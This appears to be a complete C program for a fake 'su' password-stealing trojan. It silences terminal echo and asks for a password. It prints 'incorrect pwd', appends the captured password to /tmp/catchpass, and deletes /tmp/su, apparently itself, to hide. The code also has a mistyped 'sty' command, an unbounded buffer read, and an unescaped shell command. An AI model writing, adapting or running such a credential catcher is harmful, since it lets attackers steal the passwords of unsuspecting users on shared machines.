#include<stdio.h>
int main(){
    char buf[128],passwd[20];
    system("/bin/stty -echo");
    printf("password:");
    scanf("%s",passwd);
    system("/bin/sty echo");
    printf("incorrect pwd");
    sprintf(buf,"/bin/echo %s >> /tmp/catchpass ",passwd);
    system(buf);
    system("/bin/rm /tmp/su");
    exit(0);
}